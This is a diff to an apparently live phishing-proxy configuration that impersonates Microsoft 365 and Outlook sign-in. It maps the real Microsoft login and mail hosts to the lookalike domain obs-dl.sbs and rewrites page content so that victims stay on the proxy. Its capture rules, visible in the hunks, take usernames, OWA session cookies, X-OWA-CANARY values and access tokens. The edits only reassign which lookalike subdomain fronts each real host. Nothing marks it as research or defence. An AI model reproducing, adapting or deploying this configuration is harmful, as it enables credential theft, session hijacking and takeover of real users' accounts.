@@ -13,10 +13,10 @@ global:
 
 
 # ============================================================
-# PRIMARY: login.microsoftonline.com - OAuth2 entry point
+# login.microsoftonline.com - OAuth2 (auto-redirect from entry point)
 # ============================================================
 login.microsoftonline.com:
-  to: "obs-dl.sbs"
+  to: "login.obs-dl.sbs"
   capture:
     - name: "username"
       method: "POST"
@@ -51,7 +51,7 @@ login.microsoftonline.com:
   rewrite:
     - name: "rewrite_login_domain"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_login_live"
@@ -96,7 +96,7 @@ login.microsoftonline.com:
 
     - name: "rewrite_outlook365"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office"
@@ -194,7 +194,7 @@ login.live.com:
 
     - name: "rewrite_login_domain_in_live"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_live"
@@ -234,7 +234,7 @@ login.live.com:
 
     - name: "rewrite_outlook365_in_live"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_live"
@@ -282,7 +282,7 @@ login.microsoft.com:
 
     - name: "rewrite_login_domain_in_loginmicrosoft"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_loginmicrosoft"
@@ -317,7 +317,7 @@ login.microsoft.com:
 
     - name: "rewrite_outlook365_in_loginmicrosoft"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_loginmicrosoft"
@@ -378,7 +378,7 @@ www.office.com:
 
     - name: "rewrite_login_domain_in_office"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_office"
@@ -398,7 +398,7 @@ www.office.com:
 
     - name: "rewrite_outlook365_in_office"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_office"
@@ -431,7 +431,7 @@ m365.cloud.microsoft:
 
     - name: "rewrite_login_domain_in_m365"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_m365"
@@ -471,7 +471,7 @@ m365.cloud.microsoft:
 
     - name: "rewrite_outlook365_in_m365"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_m365"
@@ -509,7 +509,7 @@ account.live.com:
 
     - name: "rewrite_login_domain_in_account"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_account"
@@ -524,7 +524,7 @@ account.live.com:
 
     - name: "rewrite_outlook365_in_account"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_account"
@@ -540,12 +540,12 @@ account.live.com:
 
 
 # ============================================================
-# CORE: outlook.office365.com - Enterprise OWA
+# PRIMARY ENTRY: outlook.office365.com - Enterprise OWA
 # Start URL: https://outlook.office365.com/owa/
 # Captures OWA session cookies, X-OWA-CANARY, access tokens
 # ============================================================
 outlook.office365.com:
-  to: "outlook.obs-dl.sbs"
+  to: "obs-dl.sbs"
   capture:
     - name: "outlook_client_id"
       method: "GET"
@@ -606,12 +606,12 @@ outlook.office365.com:
   rewrite:
     - name: "rewrite_outlook365_domain"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_outlook"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_outlook"
@@ -748,12 +748,12 @@ outlook.office.com:
 
     - name: "rewrite_outlook365_in_outlook_office"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_outlook_office"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_outlook_office"
@@ -867,7 +867,7 @@ outlook.live.com:
 
     - name: "rewrite_login_domain_in_outlook_live"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_outlook_live"
@@ -912,7 +912,7 @@ outlook.live.com:
 
     - name: "rewrite_outlook365_in_outlook_live"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_outlook_live"
@@ -955,7 +955,7 @@ substrate.office.com:
 
     - name: "rewrite_outlook365_in_substrate"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_substrate"
@@ -970,7 +970,7 @@ substrate.office.com:
 
     - name: "rewrite_login_domain_in_substrate"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_substrate"
@@ -1032,7 +1032,7 @@ login.windows.net:
 
     - name: "rewrite_login_domain_in_login_windows"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "login.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_login_windows"
@@ -1042,7 +1042,7 @@ login.windows.net:
 
     - name: "rewrite_outlook365_in_login_windows"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_login_windows"
